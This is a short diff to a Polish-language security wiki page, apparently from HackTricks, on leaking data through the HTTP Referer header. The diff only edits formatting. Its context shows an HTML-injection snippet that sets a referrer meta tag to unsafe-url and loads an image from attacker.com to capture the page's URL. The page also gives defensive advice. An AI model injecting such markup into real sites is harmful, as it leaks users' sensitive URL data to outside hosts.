@@ -24,12 +24,12 @@ Referrer-Policy: unsafe-url
 ## Counter-Mitigation
 
 Możesz nadpisać tę regułę, używając tagu meta HTML (atakujący musi wykorzystać i wstrzyknięcie HTML):
-```markup
+```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
 ## Obrona
 
-Nigdy nie umieszczaj żadnych wrażliwych danych w parametrach GET ani w ścieżkach w URL. 
+Nigdy nie umieszczaj żadnych wrażliwych danych w parametrach GET ani w ścieżkach w URL.
 
 {{#include ../banners/hacktricks-training.md}}
